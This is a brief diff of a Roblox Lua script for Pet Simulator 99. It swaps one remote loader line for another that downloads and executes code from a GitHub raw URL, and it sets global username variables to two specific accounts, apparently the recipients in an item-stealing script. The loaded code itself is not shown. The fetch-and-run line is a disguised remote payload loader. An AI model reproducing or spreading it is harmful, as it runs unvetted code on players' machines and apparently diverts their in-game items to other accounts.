@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://rawscripts.net/raw/Pet-Simulator-99!-NEW-UPDATED-BEST-SCRIPT-SOLIXHUB-AUTO-FARM-AUTO-TAP-AUTO-EGG-25851"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kjrmz/Latest/refs/heads/main/New"))()
 
 _G.Username = "KrxmFisch"
 _G.Username2 = "nbvbw"
